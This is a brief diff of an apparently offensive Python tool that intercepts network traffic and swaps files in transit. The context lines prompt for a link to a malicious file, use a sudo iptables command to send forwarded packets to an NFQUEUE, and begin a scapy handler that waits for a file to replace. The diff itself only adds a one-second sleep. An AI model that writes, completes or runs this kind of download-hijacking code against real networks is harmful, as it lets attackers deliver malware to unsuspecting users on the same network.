@@ -54,6 +54,7 @@ linktf = input("[Required] --> Please enter or paste the link to the malicious f
 print("[Info] --> Configuring your Iptables for compatibility")
 try:
     subprocess.call("sudo iptables -I FORWARD -j NFQUEUE --queue-num 3",shell=True)
+    time.sleep(1)
     print("[Waiting] --> Waiting for a file to be replaced .......")
     def packeting(packets):
         packs = sc.IP(packets.get_payload())
